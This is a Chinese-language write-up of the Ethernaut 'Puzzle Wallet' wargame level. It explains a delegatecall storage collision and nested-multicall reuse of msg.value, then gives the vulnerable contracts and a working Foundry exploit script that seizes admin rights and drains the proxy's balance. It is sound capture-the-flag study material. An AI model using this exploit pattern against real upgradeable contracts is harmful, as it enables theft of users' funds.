---
title: "Puzzle Wallet"
date: 2026-07-20
draft: false
description: "成功获取合约的admin权限"
tags:
  - Ethernaut
  - delegatecall
  - proxy
  - multicall
categories:
  - Ethernaut
series:
  - Ethernaut 闯关记录
---

### Puzzle Wallet

#### 目标：

成功获取合约的admin权限

#### 思路：

看到`PuzzleProxy`中继承了`UpgradeableProxy`，`UpgradeableProxy`继承`Proxy`。当调用`PuzzleProxy`不存在的函数时，会触发`fallback`，通过`delegatecall`执行PuzzleWallet中的代码。

观察两个合约变量的插槽，存在存储碰撞。要想夺取admin的权限，需要先获取owner权限，`pendingAdmin`和`owner`的插槽位置相同。由于delegatecall使用调用者的storage环境，因此PuzzleWallet读取和修改的实际上是PuzzleProxy的storage。调用proposeNewAdmin()时，修改PuzzleProxy.slot0中的pendingAdmin为攻击者地址。之后调用PuzzleWallet相关函数时，PuzzleWallet会把Proxy.slot0读取为owner，因此攻击者获得owner权限。

然后利用`addToWhitelist`函数使`whitelisted[msg.sender] == true`，满足onlyWhitelisted()

由于ETH实际存储在PuzzleProxy中，因此delegatecall执行PuzzleWallet代码时，address(this).balance代表PuzzleProxy余额，此时为1 ETH。而balances[msg.sender]仍为0，需要调用deposit记录余额。

第一次调用deposit时，由于外层调用已经通过msg.value将ETH发送到Proxy，delegatecall执行deposit后，仅更新Proxy storage中的balances[msg.sender]，增加1 ETH记录。 随后嵌套调用multicall，再次调用deposit。 由于delegatecall不会转移ETH，但是会继承msg.value， 第二次deposit仍然可以读取到1 ETH的msg.value。 因此： 真实余额: 1 ETH，balances[msg.sender]: 2 ETH

#### 源码：

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../helpers/UpgradeableProxy-08.sol";

contract PuzzleProxy is UpgradeableProxy {
    address public pendingAdmin;
    address public admin;

    constructor(address _admin, address _implementation, bytes memory _initData)
        UpgradeableProxy(_implementation, _initData)
    {
        admin = _admin;
    }

    modifier onlyAdmin() {
        require(msg.sender == admin, "Caller is not the admin");
        _;
    }

    function proposeNewAdmin(address _newAdmin) external {
        pendingAdmin = _newAdmin;
    }

    function approveNewAdmin(address _expectedAdmin) external onlyAdmin {
        require(pendingAdmin == _expectedAdmin, "Expected new admin by the current admin is not the pending admin");
        admin = pendingAdmin;
    }

    function upgradeTo(address _newImplementation) external onlyAdmin {
        _upgradeTo(_newImplementation);
    }
}

contract PuzzleWallet {
    address public owner;
    uint256 public maxBalance;
    mapping(address => bool) public whitelisted;
    mapping(address => uint256) public balances;

    function init(uint256 _maxBalance) public {
        require(maxBalance == 0, "Already initialized");
        maxBalance = _maxBalance;
        owner = msg.sender;
    }

    modifier onlyWhitelisted() {
        require(whitelisted[msg.sender], "Not whitelisted");
        _;
    }

    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
        require(address(this).balance == 0, "Contract balance is not 0");
        maxBalance = _maxBalance;
    }

    function addToWhitelist(address addr) external {
        require(msg.sender == owner, "Not the owner");
        whitelisted[addr] = true;
    }

    function deposit() external payable onlyWhitelisted {
        require(address(this).balance <= maxBalance, "Max balance reached");
        balances[msg.sender] += msg.value;
    }

    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {
        require(balances[msg.sender] >= value, "Insufficient balance");
        balances[msg.sender] -= value;
        (bool success,) = to.call{value: value}(data);
        require(success, "Execution failed");
    }

    function multicall(bytes[] calldata data) external payable onlyWhitelisted {
        bool depositCalled = false;
        for (uint256 i = 0; i < data.length; i++) {
            bytes memory _data = data[i];
            bytes4 selector;
            assembly {
                selector := mload(add(_data, 32))
            }
            if (selector == this.deposit.selector) {
                require(!depositCalled, "Deposit can only be called once");
                // Protect against reusing msg.value
                depositCalled = true;
            }
            (bool success,) = address(this).delegatecall(data[i]);
            require(success, "Error while delegating call");
        }
    }
}

```

#### poc:

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

interface IPuzzleProxy{
    function proposeNewAdmin(address _newAdmin) external;
    function addToWhitelist(address addr) external;
    function execute(address to, uint256 value, bytes calldata data) external payable;
    function setMaxBalance(uint256 _maxBalance) external;
    function multicall(bytes[] calldata data) external payable;
}

contract Attack is Script{
    IPuzzleProxy PuzzleProxy = IPuzzleProxy(0x64718Fc6EaFE64BD36dE05d9583c5432B04c0C5B);

    function run() external{
    vm.startBroadcast();

    PuzzleProxy.proposeNewAdmin(msg.sender);
    PuzzleProxy.addToWhitelist(msg.sender);

    bytes[] memory Data = new bytes[](1);
    Data[0] = abi.encodeWithSignature("deposit()");
    bytes[] memory data = new bytes[](2);
    data[0] = abi.encodeWithSignature("deposit()");
    data[1] = abi.encodeWithSignature("multicall(bytes[])", Data);
    PuzzleProxy.multicall{value: address(PuzzleProxy).balance}(data);


    PuzzleProxy.execute(msg.sender,address(PuzzleProxy).balance,"");
    PuzzleProxy.setMaxBalance(uint256(uint160(msg.sender)));

    vm.stopBroadcast();
    }
}
```
